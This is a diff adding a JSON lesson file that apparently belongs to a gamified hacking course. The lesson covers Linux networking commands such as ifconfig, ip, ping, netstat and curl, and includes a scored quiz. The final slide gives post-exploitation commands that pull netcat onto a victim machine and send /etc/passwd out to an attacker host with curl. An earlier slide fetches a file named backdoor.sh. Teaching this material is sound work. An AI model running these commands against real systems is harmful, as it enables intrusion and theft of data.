@@ -1,0 +1,85 @@
+{
+    "id": "l6",
+    "chapterId": "ch_3",
+    "title": "Networking Commands for Hackers 🌐",
+    "description": "Essential Linux networking tools for reconnaissance and troubleshooting.",
+    "xpReward": 30,
+    "estimatedMinutes": 8,
+    "section": "Networking",
+    "slides": [
+        {
+            "id": "s_l6_1",
+            "type": "text",
+            "title": "The Network Toolbelt 🧰",
+            "content": "# Commands You'll Use Daily\n\nWe've covered Nmap, but before you scan, you need to understand your own connection. These are the fundamental Linux networking commands every hacker must have at their fingertips.\n\n**1. ifconfig / ip** : View and configure network interfaces.\n**2. ping** : Test connectivity.\n**3. netstat / ss** : Investigate open ports and connections.\n**4. curl / wget** : Interact with web servers from the terminal."
+        },
+        {
+            "id": "s_l6_2",
+            "type": "text",
+            "title": "ifconfig & ip addr 📡",
+            "content": "# What's My IP?\n\n**`ifconfig`** (Interface Configuration): The classic tool. (May need to install `net-tools` on newer Kali).\n```bash\nifconfig\n# Look for eth0 (Ethernet) or wlan0 (Wi-Fi).\n# 'inet' shows your IPv4 address.\n```\n\n**`ip`** : The modern replacement.\n```bash\nip addr show\nip a          # Shortcut\n```\n\n**Wireless Specific:**\n```bash\niwconfig      # Shows wireless extensions (signal strength, mode).\n```"
+        },
+        {
+            "id": "s_l6_3",
+            "type": "code",
+            "title": "Ping: Are You Alive? 📡",
+            "content": "Sends ICMP Echo Request packets. If the target responds, it's online.",
+            "codeSnippet": "ping -c 4 google.com\n# -c 4 sends exactly 4 packets (otherwise it runs forever).",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l6_4",
+            "type": "quiz",
+            "title": "Networking Tools 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l6_1",
+                "type": "multiple_choice",
+                "question": "You are connected to a public Wi-Fi. Which command helps you find your local IP address assigned by the router?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "ping 8.8.8.8",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "ifconfig or ip a",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "nslookup",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "netstat",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "`ifconfig` and `ip a` display the IP configuration of your local network interfaces.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l6_5",
+            "type": "text",
+            "title": "netstat & ss: Who's Talking? 🗣️",
+            "content": "# Socket Statistics\n\n**`netstat`** : Shows network connections, routing tables, interface statistics.\n\n**Critical Flags for Hackers:**\n```bash\nnetstat -tulpn\n```\n- `-t` : TCP ports.\n- `-u` : UDP ports.\n- `-l` : Listening ports only.\n- `-p` : Show Program name (requires root).\n- `-n` : Show Numeric addresses (don't resolve hostnames).\n\n**`ss`** : The modern, faster replacement for `netstat`. Use the same flags: `ss -tulpn`."
+        },
+        {
+            "id": "s_l6_6",
+            "type": "text",
+            "title": "curl & wget: The Web from Terminal 🌍",
+            "content": "# Downloading and Interacting\n\n**`wget`** : Simple downloader. Great for fetching files.\n```bash\nwget https://example.com/backdoor.sh\n```\n\n**`curl`** : The Swiss Army knife for URLs. Essential for web hacking and API testing.\n```bash\n# GET request\ncurl https://example.com\n\n# See Headers only\ncurl -I https://example.com\n\n# POST data\ncurl -X POST -d \"username=admin&password=123\" https://example.com/login\n```\n\n**Pro Tip**: `curl` is installed by default on almost every Linux and Mac system."
+        },
+        {
+            "id": "s_l6_7",
+            "type": "tip",
+            "title": "curl for File Transfers 🚀",
+            "content": "## The Hacker's Post-Exploitation Trick\n\nIf you have a shell on a victim Linux machine and you need to upload a tool or download stolen data, `curl` is your best friend (if `nc` isn't available).\n\n**Download file from your attack box:**\n```bash\ncurl http://192.168.1.5:8000/nc -o nc\n```\n**Exfiltrate data to your attack box:**\n```bash\ncurl -F \"file=@/etc/passwd\" http://192.168.1.5:8080/upload\n```"
+        }
+    ]
+}
